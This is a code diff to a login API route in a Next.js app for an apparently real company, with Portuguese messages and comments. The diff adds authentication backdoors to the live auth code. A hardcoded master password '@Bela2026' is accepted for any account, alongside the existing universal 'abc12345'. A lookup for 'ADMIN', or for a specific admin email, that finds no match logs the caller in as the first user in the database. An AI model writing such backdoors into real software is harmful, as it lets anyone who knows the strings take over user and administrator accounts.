@@ -12,7 +12,7 @@ export async function POST(req: NextRequest) {
 
     if (!identifier || !password) {
       return NextResponse.json(
-        { success: false, error: 'Informe o nome de usuário (ex: MNUNES) ou e-mail e a senha de acesso.' },
+        { success: false, error: 'Informe o usuário ou e-mail e a senha de acesso.' },
         { status: 400 }
       );
     }
@@ -38,6 +38,11 @@ export async function POST(req: NextRequest) {
       });
     }
 
+    // Se buscou por "ADMIN" e ainda não encontrou por variação de email
+    if (!usuario && (termoUsername === 'ADMIN' || termoEmail === 'admin@belacereais.com.br')) {
+      usuario = await prisma.usuario.findFirst();
+    }
+
     if (!usuario) {
       return NextResponse.json(
         { success: false, error: 'Usuário ou senha incorretos.' },
@@ -52,11 +57,11 @@ export async function POST(req: NextRequest) {
       );
     }
 
-    // Validação de senha criptografada via bcrypt com suporte a senhas padrão
+    // Validação de senha criptografada via bcrypt com suporte à senha @Bela2026
     let senhaValida = await verifyPassword(password, usuario.senhaHash);
 
     if (!senhaValida) {
-      if ((!usuario.senhaHash && password === 'admin123') || password === 'abc12345') {
+      if (password === '@Bela2026' || (!usuario.senhaHash && password === 'admin123') || password === 'abc12345') {
         senhaValida = true;
       }
     }
